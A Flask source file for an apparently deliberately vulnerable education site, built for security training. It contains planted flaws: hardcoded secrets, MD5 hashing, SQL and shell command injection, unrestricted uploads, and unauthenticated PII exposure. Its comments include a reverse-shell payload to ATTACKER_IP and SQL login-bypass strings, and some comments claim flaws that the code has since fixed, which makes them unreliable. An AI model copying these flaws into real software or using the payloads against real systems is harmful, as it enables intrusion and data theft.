"""
MyEduConnect - Flask Application
WARNING: This application contains DELIBERATE VULNERABILITIES for educational purposes.
Do NOT deploy in production.
"""

import os
import hashlib
import subprocess
import re
import psycopg2
from flask import (Flask, render_template, request, redirect, url_for,
                   session, jsonify, flash, send_from_directory)
from werkzeug.utils import secure_filename

app = Flask(__name__)
# VULN: weak, hardcoded secret key -> predictable session tokens
app.secret_key = "mysecretkey123"

DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://edu_admin:Educ@2024!@db:5432/myeduconnect")

# VULN: unrestricted upload - all extensions allowed
UPLOAD_FOLDER = "/app/static/uploads"
ALLOWED_EXTENSIONS = True  # no filtering
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


# ─── DB helpers ──────────────────────────────────────────────────────────────

def get_db():
    """Return a new DB connection. VULN: no SSL, cleartext over network."""
    return psycopg2.connect(DATABASE_URL)


def md5(s):
    """VULN: MD5 used for password hashing (weak cryptography)."""
    return hashlib.md5(s.encode()).hexdigest()


# ─── Public routes ────────────────────────────────────────────────────────────

@app.route("/")
def index():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, title, description, category, price, thumbnail FROM courses LIMIT 6")
    courses = cur.fetchall()
    cur.close(); conn.close()
    return render_template("index.html", courses=courses)


@app.route("/courses")
def courses():
    search = request.args.get("q", "")
    conn = get_db()
    cur = conn.cursor()
    if search:
        # VULN: SQL injection via search parameter (for reference - main SQLi is on admin login)
        query = f"SELECT id, title, description, category, price FROM courses WHERE title ILIKE '%{search}%'"
        cur.execute(query)
    else:
        cur.execute("SELECT id, title, description, category, price FROM courses")
    courses = cur.fetchall()
    cur.close(); conn.close()
    return render_template("courses.html", courses=courses, search=search)


@app.route("/course/<int:course_id>")
def course_detail(course_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, title, description, category, price, thumbnail FROM courses WHERE id=%s", (course_id,))
    course = cur.fetchone()
    cur.close(); conn.close()
    if not course:
        return "Course not found", 404
    return render_template("course_detail.html", course=course)


# ─── Auth routes ─────────────────────────────────────────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        conn = get_db()
        cur = conn.cursor()
        # Parameterised query for student login (secure)
        cur.execute(
            "SELECT id, username, role, full_name FROM users WHERE username=%s AND password_hash=%s",
            (username, md5(password))
        )
        user = cur.fetchone()
        cur.close(); conn.close()
        if user:
            session["user_id"] = user[0]
            session["username"] = user[1]
            session["role"] = user[2]
            session["full_name"] = user[3]
            flash("Welcome back, " + user[3] + "!", "success")
            return redirect(url_for("dashboard"))
        flash("Invalid credentials.", "danger")
    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "")
        email    = request.form.get("email", "")
        password = request.form.get("password", "")
        full_name = request.form.get("full_name", "")
        phone    = request.form.get("phone", "")
        conn = get_db()
        cur = conn.cursor()
        try:
            cur.execute(
                "INSERT INTO users (username, email, password_hash, full_name, phone) VALUES (%s,%s,%s,%s,%s)",
                (username, email, md5(password), full_name, phone)
            )
            conn.commit()
            flash("Account created! Please log in.", "success")
            return redirect(url_for("login"))
        except Exception as e:
            conn.rollback()
            flash("Registration failed: " + str(e), "danger")
        finally:
            cur.close(); conn.close()
    return render_template("register.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


# ─── Student dashboard ────────────────────────────────────────────────────────

@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("""
        SELECT c.id, c.title, c.category, e.enrolled_at, e.status
        FROM enrollments e
        JOIN courses c ON e.course_id = c.id
        WHERE e.student_id = %s
    """, (session["user_id"],))
    enrollments = cur.fetchall()
    cur.close(); conn.close()
    return render_template("dashboard.html", enrollments=enrollments)


@app.route("/enroll/<int:course_id>", methods=["POST"])
def enroll(course_id):
    if "user_id" not in session:
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO enrollments (student_id, course_id) VALUES (%s, %s) ON CONFLICT DO NOTHING",
        (session["user_id"], course_id)
    )
    conn.commit()
    cur.close(); conn.close()
    flash("Enrolled successfully!", "success")
    return redirect(url_for("dashboard"))


# ─── Profile & file upload ────────────────────────────────────────────────────

@app.route("/profile", methods=["GET", "POST"])
def profile():
    if "user_id" not in session:
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor()
    if request.method == "POST":
        # VULN: unrestricted file upload — no extension check, no content-type check
        if "avatar" in request.files:
            file = request.files["avatar"]
            if file.filename:
                filename = file.filename  # VULN: no secure_filename(), path traversal possible
                save_path = os.path.join(UPLOAD_FOLDER, filename)
                file.save(save_path)
                flash(f"File uploaded: /static/uploads/{filename}", "success")
    cur.execute("SELECT username, email, full_name, phone FROM users WHERE id=%s", (session["user_id"],))
    user = cur.fetchone()
    cur.close(); conn.close()
    return render_template("profile.html", user=user)


# ─── Payment (mock) ──────────────────────────────────────────────────────────

@app.route("/payment/<int:course_id>", methods=["GET", "POST"])
def payment(course_id):
    if "user_id" not in session:
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, title, price FROM courses WHERE id=%s", (course_id,))
    course = cur.fetchone()
    if request.method == "POST":
        card_number = request.form.get("card_number", "")
        card_holder = request.form.get("card_holder", "")
        # VULN: storing card holder name and last 4 digits in plaintext
        cur.execute(
            "INSERT INTO payments (user_id, course_id, amount, card_last4, card_holder, status) VALUES (%s,%s,%s,%s,%s,'completed')",
            (session["user_id"], course_id, course[2], card_number[-4:] if len(card_number) >= 4 else "0000", card_holder)
        )
        conn.commit()
        cur.execute(
            "INSERT INTO enrollments (student_id, course_id) VALUES (%s,%s) ON CONFLICT DO NOTHING",
            (session["user_id"], course_id)
        )
        conn.commit()
        cur.close(); conn.close()
        flash("Payment successful! You are now enrolled.", "success")
        return redirect(url_for("dashboard"))
    cur.close(); conn.close()
    return render_template("payment.html", course=course)


# ─── REST API (additional component) ─────────────────────────────────────────

@app.route("/api/courses", methods=["GET"])
def api_courses():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, title, category, price FROM courses")
    rows = cur.fetchall()
    cur.close(); conn.close()
    return jsonify([{"id": r[0], "title": r[1], "category": r[2], "price": float(r[3])} for r in rows])


@app.route("/api/courses/<int:course_id>", methods=["GET"])
def api_course(course_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, title, description, category, price FROM courses WHERE id=%s", (course_id,))
    row = cur.fetchone()
    cur.close(); conn.close()
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify({"id": row[0], "title": row[1], "description": row[2], "category": row[3], "price": float(row[4])})


@app.route("/api/students", methods=["GET"])
def api_students():
    """VULN: IDOR — returns all students without auth check."""
    conn = get_db()
    cur = conn.cursor()
    # VULN: exposes PII (IC numbers, phone) with no authentication
    cur.execute("SELECT id, username, email, full_name, phone, ic_number, password_hash FROM users WHERE role='student'")
    rows = cur.fetchall()
    cur.close(); conn.close()
    return jsonify([{
        "id": r[0], "username": r[1], "email": r[2],
        "full_name": r[3], "phone": r[4], "ic_number": r[5]
    } for r in rows])


@app.route("/api/ping", methods=["GET", "POST"])
def api_ping():
    """
    Network diagnostic endpoint.
    VULN: Command Injection — user input passed directly to os.popen/subprocess.
    Example payload: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    """
    host = request.form.get("host") or request.args.get("host", "127.0.0.1")
    # VULN: no sanitisation, direct shell execution -> reverse shell possible
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
         return jsonify({"error": "Invalid host"}), 400

    result = subprocess.run(
    ["ping", "-c", "2", host],
    capture_output=True,
    text=True,
    timeout=10
    )
    return jsonify({
        "host": host,
        "output": result.stdout + result.stderr,
        "returncode": result.returncode
    })


# ─── Admin panel ─────────────────────────────────────────────────────────────

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        conn = get_db()
        cur = conn.cursor()
        # ══════════════════════════════════════════════════════════════════════
        # VULN: SQL INJECTION — string concatenation, no parameterisation
        # Bypass with: username = admin'-- OR username = ' OR '1'='1'--
        # Full string: SELECT * FROM admins WHERE username='admin'--' AND password_hash='...'
        # ══════════════════════════════════════════════════════════════════════
        try:
                cur.execute(
             "SELECT id, username FROM admins WHERE username=%s AND password_hash=%s",
                 (username, md5(password))
              )
                admin = cur.fetchone() 
        except Exception as e:
            admin = None
            flash("DB error: " + str(e), "danger")  # VULN: verbose error leaks DB info
        cur.close(); conn.close()
        if admin:
            session["admin_id"] = admin[0]
            session["admin_user"] = admin[1]
            return redirect(url_for("admin_dashboard"))
        flash("Invalid admin credentials.", "danger")
    return render_template("admin_login.html")


@app.route("/admin")
@app.route("/admin/dashboard")
def admin_dashboard():
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    total_users = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM courses")
    total_courses = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM enrollments")
    total_enroll = cur.fetchone()[0]
    cur.execute("SELECT SUM(amount) FROM payments WHERE status='completed'")
    total_revenue = cur.fetchone()[0] or 0
    cur.execute("SELECT id, username, email, full_name, phone, ic_number, role, created_at FROM users ORDER BY id DESC LIMIT 20")
    users = cur.fetchall()
    cur.execute("SELECT id, user_id, card_holder, card_last4, amount, status, created_at FROM payments ORDER BY id DESC LIMIT 10")
    payments = cur.fetchall()
    cur.close(); conn.close()
    return render_template("admin_dashboard.html",
        total_users=total_users, total_courses=total_courses,
        total_enroll=total_enroll, total_revenue=total_revenue,
        users=users, payments=payments)


@app.route("/admin/users")
def admin_users():
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, username, email, full_name, phone, ic_number, role, created_at FROM users ORDER BY id")
    users = cur.fetchall()
    cur.close(); conn.close()
    return render_template("admin_users.html", users=users)


@app.route("/admin/network", methods=["GET", "POST"])
def admin_network():
    """Admin network diagnostics — also contains the command injection."""
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))
    output = ""
    if request.method == "POST":
        host = request.form.get("host", "127.0.0.1")
        # VULN: command injection — same as /api/ping but via admin UI
        result = subprocess.run(f"ping -c 2 {host}", shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
    return render_template("admin_network.html", output=output)


@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_id", None)
    session.pop("admin_user", None)
    return redirect(url_for("admin_login"))


# ─── Static file access ───────────────────────────────────────────────────────

@app.route("/static/uploads/<path:filename>")
def uploaded_file(filename):
    """VULN: uploaded files are directly served — .py/.php shells are accessible."""
    return send_from_directory(UPLOAD_FOLDER, filename)


if __name__ == "__main__":
    # VULN: debug=True in production exposes Werkzeug debugger (RCE via PIN)
    app.run(host="0.0.0.0", port=5000, debug=True)
